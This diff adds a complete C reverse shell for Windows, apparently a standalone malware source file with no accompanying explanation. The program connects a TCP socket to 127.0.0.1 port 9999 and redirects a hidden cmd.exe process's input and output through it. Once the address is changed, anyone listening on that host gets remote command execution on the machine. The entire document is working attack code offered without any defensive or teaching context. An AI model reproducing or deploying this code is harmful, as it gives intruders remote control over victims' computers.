@@ -1,0 +1,55 @@
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#pragma comment(lib, "ws2_32.lib")
+
+#include <WinSock2.h>
+#include <stdio.h>
+#include <Windows.h>
+
+
+
+int main(int argc, char** argv[]) {
+	WSADATA WsaData;
+	STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+	SOCKET ResultSocket;
+	struct sockaddr_in socketadr;
+	ZeroMemory( &si, sizeof(si) );
+    si.cb = sizeof(si);
+    ZeroMemory( &pi, sizeof(pi) );
+	if (WSAStartup(MAKEWORD(2, 2), &WsaData)) {
+		printf("Could not initialize WSA!\n");
+		exit(EXIT_FAILURE);
+	}
+	ResultSocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+	
+	socketadr.sin_family = AF_INET;
+	socketadr.sin_addr.s_addr = inet_addr("127.0.0.1");
+	socketadr.sin_port = htons(9999);
+
+	if (connect(ResultSocket, (struct sockaddr*) & socketadr, sizeof(socketadr))) {
+		printf("Could not connect to server!\n");
+	}
+	
+	//Create process
+
+
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	si.dwFlags = STARTF_USESTDHANDLES;
+	si.wShowWindow = SW_HIDE;
+	si.hStdError = (HANDLE)ResultSocket;
+	si.hStdInput = (HANDLE)ResultSocket;
+	si.hStdOutput = (HANDLE)ResultSocket;
+
+	ZeroMemory(&pi, sizeof(pi));
+		
+	if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+		printf("Could not create process!\n");
+		WSACleanup();
+		exit(EXIT_FAILURE);
+	}
+	WaitForSingleObject(pi.hProcess, -1);
+	WSACleanup();
+	CloseHandle(pi.hProcess);
+	return 0;
+}
